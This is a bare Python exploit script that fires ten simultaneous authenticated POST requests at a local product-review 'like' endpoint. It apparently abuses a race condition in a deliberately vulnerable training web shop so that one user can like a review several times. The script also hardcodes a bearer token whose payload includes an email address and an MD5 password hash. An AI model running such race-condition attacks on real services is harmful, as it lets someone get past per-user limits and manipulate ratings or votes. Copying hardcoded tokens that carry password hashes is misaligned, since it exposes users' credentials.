import requests
import threading

url = 'http://localhost:3000/rest/products/reviews'
data = {"id": "CQZiFQvNnriqToC6k"}
auth = {"authorization" : "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiIyQDIucGwiLCJwYXNzd29yZCI6IjNkMjE3MjQxOGNlMzA1YzdkMTZkNGIwNTU5N2M2YTU5Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEyNy4wLjAuMSIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA1LTExIDE5OjEzOjA2Ljg5MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA1LTExIDE5OjI1OjQxLjY4MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3Nzg1Mjc5MzR9.f4kqj2C22uuq60MqvQ7eoXb4LUk4zw7z5DIVofqCNfGwBE6GdX8O5bTyVQJ1cm6v80FtfrCV3qeEIr_Y63nsbMRTj3TIrDaal8ex3EDJUphQJ7zjjW2Gv3XumVNXDdV1miRgUVVsoFxYWDFez8OAJHMaB7OHQx8SvdDr3bHT2ho"}

def send_like():
    request = requests.post(url, json = data, headers = auth)
    print(request.status_code)

for i in range(10):
    threading.Thread(target=send_like).start()